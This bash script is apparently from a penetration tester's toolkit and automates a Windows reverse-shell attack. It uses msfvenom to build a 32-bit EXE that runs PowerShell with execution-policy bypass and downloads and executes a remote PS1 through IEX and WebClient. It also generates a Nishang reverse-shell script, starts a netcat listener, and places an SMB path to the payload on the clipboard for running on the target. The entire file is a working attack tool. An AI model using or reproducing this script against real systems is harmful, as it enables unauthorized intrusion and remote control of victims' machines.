#!/bin/bash
source /root/Ops/Commands/colors.sh
if [ $# -eq 0 ]; then
  echo "Usage:"
  echo "bash MSF_PS_EXE_windows_32.sh [web server port] [reverse port]"
  echo "bash MSF_PS_EXE_windows_32.sh [web server port] [reverse port]" | clip
  exit 1
fi
IP=$( IP_No_Clip );                      
New_IP=$( echo -n $IP );  

echo -e "${YELLOW}[+] Creating Backup Reverse EXE Shell";
echo -e "${CYAN}msfvenom -a x86 --platform Windows -p windows/exec CMD=\"powershell.exe -nop -ep bypass -c \"IEX(New-Object Net.WebClient).downloadString('http://$New_IP:$1/reverse_$2.ps1')\"\" -f exe -o backup_32shell_$2.exe";
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell.exe -nop -ep bypass -c \"IEX(New-Object Net.WebClient).downloadString('http://$New_IP:$1/reverse_$2.ps1')\"" -f exe -o backup_32shell_$2.exe;
echo -e "${GREEN}Backup Reverse EXE Shell created.\n";

echo -e "${YELLOW}[+] Creating Nishang PS1 file.";
echo -e "${CYAN}Nishang $2";
Nishang $2;
echo -e "${GREEN}Nishang PS1 file created.\n";

echo -e "${YELLOW}[+] Opening a listener for you to get the shell.";
echo -e "${CYAN}rlwrap nc -lvnp $2\n";

echo -e "${GREEN}Ready...Execute backup_32shell_$2.exe from target through smb_server, please :)";
echo -e "${CYAN}\\\\\\$New_IP\\\brwn\\\backup_32shell_$2.exe\n";
echo "\\\\$New_IP\\brwn\\backup_32shell_$2.exe" | clip;

rlwrap nc -lvnp $2;
